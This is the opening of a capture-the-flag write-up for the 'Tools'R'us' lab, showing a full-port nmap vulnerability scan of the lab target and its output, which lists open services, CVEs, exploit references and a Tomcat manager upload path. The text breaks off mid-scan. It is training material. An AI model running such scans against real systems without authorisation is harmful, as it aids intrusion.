# Tools'R'us

We're supposed to restrict ourselves to the following tools in this CTF:

* dirbuster
* Hydra
* nmap
* Nikto
* Metasploit

It's been a little while since I had the chance to use some of these, so let's find out how rusty I am!

## Narrative

The target is at 10.10.28.154. Visiting http://10.10.28.154 reveals a "down for maintenance" page with no other links, but with the cryptic promise that "[o]ther parts of ther website is [sic] still functional…"

We'll start off with an nmap scan.

```bash
sudo nmap -v -oA tools-r-us -Pn -A -T4 -sS -script vuln \
          -p- 10.10.28.154
```

This gives the following output:

```
# Nmap 7.92 scan initiated Sun Jan 30 15:52:33 2022 as: nmap -v -oA tools-r-us -Pn -A -T4 -sS -script vuln -p- 10.10.28.154
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 10.10.28.154
Host is up (0.17s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|     	PACKETSTORM:140070	7.8	https://vulners.com/packetstorm/PACKETSTORM:140070	*EXPLOIT*
|     	EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	7.8	https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	*EXPLOIT*
|     	EDB-ID:40888	7.8	https://vulners.com/exploitdb/EDB-ID:40888	*EXPLOIT*
|     	CVE-2016-8858	7.8	https://vulners.com/cve/CVE-2016-8858
|     	CVE-2016-6515	7.8	https://vulners.com/cve/CVE-2016-6515
|     	1337DAY-ID-26494	7.8	https://vulners.com/zdt/1337DAY-ID-26494	*EXPLOIT*
|     	SSV:92579	7.5	https://vulners.com/seebug/SSV:92579	*EXPLOIT*
|     	CVE-2016-10009	7.5	https://vulners.com/cve/CVE-2016-10009
|     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576	*EXPLOIT*
|     	SSV:92582	7.2	https://vulners.com/seebug/SSV:92582	*EXPLOIT*
|     	CVE-2016-10012	7.2	https://vulners.com/cve/CVE-2016-10012
|     	CVE-2015-8325	7.2	https://vulners.com/cve/CVE-2015-8325
|     	SSV:92580	6.9	https://vulners.com/seebug/SSV:92580	*EXPLOIT*
|     	CVE-2016-10010	6.9	https://vulners.com/cve/CVE-2016-10010
|     	1337DAY-ID-26577	6.9	https://vulners.com/zdt/1337DAY-ID-26577	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2019-25017/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/IBM-AIX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	*EXPLOIT*
|     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
|     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
|     	EDB-ID:46516	5.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
|     	EDB-ID:46193	5.8	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
|     	CVE-2019-6111	5.8	https://vulners.com/cve/CVE-2019-6111
|     	1337DAY-ID-32328	5.8	https://vulners.com/zdt/1337DAY-ID-32328	*EXPLOIT*
|     	1337DAY-ID-32009	5.8	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
|     	SSV:91041	5.5	https://vulners.com/seebug/SSV:91041	*EXPLOIT*
|     	PACKETSTORM:140019	5.5	https://vulners.com/packetstorm/PACKETSTORM:140019	*EXPLOIT*
|     	PACKETSTORM:136234	5.5	https://vulners.com/packetstorm/PACKETSTORM:136234	*EXPLOIT*
|     	EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	5.5	https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	*EXPLOIT*
|     	EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	5.5	https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	*EXPLOIT*
|     	EXPLOITPACK:1902C998CBF9154396911926B4C3B330	5.5	https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330	*EXPLOIT*
|     	EDB-ID:40858	5.5	https://vulners.com/exploitdb/EDB-ID:40858	*EXPLOIT*
|     	EDB-ID:40119	5.5	https://vulners.com/exploitdb/EDB-ID:40119	*EXPLOIT*
|     	EDB-ID:39569	5.5	https://vulners.com/exploitdb/EDB-ID:39569	*EXPLOIT*
|     	CVE-2016-3115	5.5	https://vulners.com/cve/CVE-2016-3115
|     	SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
|     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	*EXPLOIT*
|     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
|     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
|     	EDB-ID:45939	5.0	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
|     	EDB-ID:45233	5.0	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
|     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2018-15473	5.0	https://vulners.com/cve/CVE-2018-15473
|     	CVE-2017-15906	5.0	https://vulners.com/cve/CVE-2017-15906
|     	CVE-2016-10708	5.0	https://vulners.com/cve/CVE-2016-10708
|     	1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730	*EXPLOIT*
|     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	*EXPLOIT*
|     	EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	*EXPLOIT*
|     	EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	*EXPLOIT*
|     	EDB-ID:40136	4.3	https://vulners.com/exploitdb/EDB-ID:40136	*EXPLOIT*
|     	EDB-ID:40113	4.3	https://vulners.com/exploitdb/EDB-ID:40113	*EXPLOIT*
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2016-6210	4.3	https://vulners.com/cve/CVE-2016-6210
|     	1337DAY-ID-25440	4.3	https://vulners.com/zdt/1337DAY-ID-25440	*EXPLOIT*
|     	1337DAY-ID-25438	4.3	https://vulners.com/zdt/1337DAY-ID-25438	*EXPLOIT*
|     	CVE-2019-6110	4.0	https://vulners.com/cve/CVE-2019-6110
|     	CVE-2019-6109	4.0	https://vulners.com/cve/CVE-2019-6109
|     	CVE-2018-20685	2.6	https://vulners.com/cve/CVE-2018-20685
|     	SSV:92581	2.1	https://vulners.com/seebug/SSV:92581	*EXPLOIT*
|     	CVE-2016-10011	2.1	https://vulners.com/cve/CVE-2016-10011
|     	SRC-2016-0002	0.0	https://vulners.com/srcincite/SRC-2016-0002	*EXPLOIT*
|     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
|     	PACKETSTORM:140261	0.0	https://vulners.com/packetstorm/PACKETSTORM:140261	*EXPLOIT*
|     	PACKETSTORM:138006	0.0	https://vulners.com/packetstorm/PACKETSTORM:138006	*EXPLOIT*
|     	PACKETSTORM:137942	0.0	https://vulners.com/packetstorm/PACKETSTORM:137942	*EXPLOIT*
|_    	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937	*EXPLOIT*
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-enum: 
|_  /protected/: Potentially interesting folder (401 Unauthorized)
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|     	CVE-2021-44790	7.5	https://vulners.com/cve/CVE-2021-44790
|     	CVE-2021-39275	7.5	https://vulners.com/cve/CVE-2021-39275
|     	CVE-2021-26691	7.5	https://vulners.com/cve/CVE-2021-26691
|     	CVE-2017-7679	7.5	https://vulners.com/cve/CVE-2017-7679
|     	CVE-2017-7668	7.5	https://vulners.com/cve/CVE-2017-7668
|     	CVE-2017-3169	7.5	https://vulners.com/cve/CVE-2017-3169
|     	CVE-2017-3167	7.5	https://vulners.com/cve/CVE-2017-3167
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	*EXPLOIT*
|     	EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	7.2	https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	*EXPLOIT*
|     	EDB-ID:46676	7.2	https://vulners.com/exploitdb/EDB-ID:46676	*EXPLOIT*
|     	CVE-2019-0211	7.2	https://vulners.com/cve/CVE-2019-0211
|     	1337DAY-ID-32502	7.2	https://vulners.com/zdt/1337DAY-ID-32502	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/FREEBSD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	*EXPLOIT*
|     	FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	6.8	https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	*EXPLOIT*
|     	CVE-2021-40438	6.8	https://vulners.com/cve/CVE-2021-40438
|     	CVE-2020-35452	6.8	https://vulners.com/cve/CVE-2020-35452
|     	CVE-2018-1312	6.8	https://vulners.com/cve/CVE-2018-1312
|     	CVE-2017-15715	6.8	https://vulners.com/cve/CVE-2017-15715
|     	4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	6.8	https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	*EXPLOIT*
|     	CVE-2021-44224	6.4	https://vulners.com/cve/CVE-2021-44224
|     	CVE-2019-10082	6.4	https://vulners.com/cve/CVE-2019-10082
|     	CVE-2017-9788	6.4	https://vulners.com/cve/CVE-2017-9788
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	*EXPLOIT*
|     	CVE-2019-0217	6.0	https://vulners.com/cve/CVE-2019-0217
|     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
|     	CVE-2019-10098	5.8	https://vulners.com/cve/CVE-2019-10098
|     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577	*EXPLOIT*
|     	CVE-2016-5387	5.1	https://vulners.com/cve/CVE-2016-5387
|     	SSV:96537	5.0	https://vulners.com/seebug/SSV:96537	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1333/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1303/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	*EXPLOIT*
|     	EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	5.0	https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	*EXPLOIT*
|     	EXPLOITPACK:2666FB0676B4B582D689921651A30355	5.0	https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355	*EXPLOIT*
|     	EDB-ID:42745	5.0	https://vulners.com/exploitdb/EDB-ID:42745	*EXPLOIT*
|     	EDB-ID:40909	5.0	https://vulners.com/exploitdb/EDB-ID:40909	*EXPLOIT*
|     	CVE-2021-34798	5.0	https://vulners.com/cve/CVE-2021-34798
|     	CVE-2021-33193	5.0	https://vulners.com/cve/CVE-2021-33193
|     	CVE-2021-26690	5.0	https://vulners.com/cve/CVE-2021-26690
|     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
|     	CVE-2019-17567	5.0	https://vulners.com/cve/CVE-2019-17567
|     	CVE-2019-0220	5.0	https://vulners.com/cve/CVE-2019-0220
|     	CVE-2019-0196	5.0	https://vulners.com/cve/CVE-2019-0196
|     	CVE-2018-17199	5.0	https://vulners.com/cve/CVE-2018-17199
|     	CVE-2018-17189	5.0	https://vulners.com/cve/CVE-2018-17189
|     	CVE-2018-1333	5.0	https://vulners.com/cve/CVE-2018-1333
|     	CVE-2018-1303	5.0	https://vulners.com/cve/CVE-2018-1303
|     	CVE-2017-9798	5.0	https://vulners.com/cve/CVE-2017-9798
|     	CVE-2017-15710	5.0	https://vulners.com/cve/CVE-2017-15710
|     	CVE-2016-8743	5.0	https://vulners.com/cve/CVE-2016-8743
|     	CVE-2016-8740	5.0	https://vulners.com/cve/CVE-2016-8740
|     	CVE-2016-4979	5.0	https://vulners.com/cve/CVE-2016-4979
|     	1337DAY-ID-28573	5.0	https://vulners.com/zdt/1337DAY-ID-28573	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	4.9	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	*EXPLOIT*
|     	CVE-2019-0197	4.9	https://vulners.com/cve/CVE-2019-0197
|     	MSF:ILITIES/UBUNTU-CVE-2018-1302/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1301/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	*EXPLOIT*
|     	CVE-2020-11985	4.3	https://vulners.com/cve/CVE-2020-11985
|     	CVE-2019-10092	4.3	https://vulners.com/cve/CVE-2019-10092
|     	CVE-2018-1302	4.3	https://vulners.com/cve/CVE-2018-1302
|     	CVE-2018-1301	4.3	https://vulners.com/cve/CVE-2018-1301
|     	CVE-2018-11763	4.3	https://vulners.com/cve/CVE-2018-11763
|     	CVE-2016-4975	4.3	https://vulners.com/cve/CVE-2016-4975
|     	CVE-2016-1546	4.3	https://vulners.com/cve/CVE-2016-1546
|     	4013EC74-B3C1-5D95-938A-54197A58586D	4.3	https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D	*EXPLOIT*
|     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	*EXPLOIT*
|     	CVE-2018-1283	3.5	https://vulners.com/cve/CVE-2018-1283
|     	CVE-2016-8612	3.3	https://vulners.com/cve/CVE-2016-8612
|     	PACKETSTORM:152441	0.0	https://vulners.com/packetstorm/PACKETSTORM:152441	*EXPLOIT*
|_    	MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/	0.0	https://vulners.com/metasploit/MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/	*EXPLOIT*
|_http-dombased-xss: Couldn't find any DOM based XSS.
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|_  /docs/: Potentially interesting folder
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Apache-Coyote/1.1
|_http-dombased-xss: Couldn't find any DOM based XSS.
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/30%OT=22%CT=1%CU=32123%PV=Y%DS=4%DC=T%G=Y%TM=61F71BC
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10F%TI=Z%TS=8)SEQ(SP=104%GC
OS:D=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M50
OS:6NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%
OS:W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
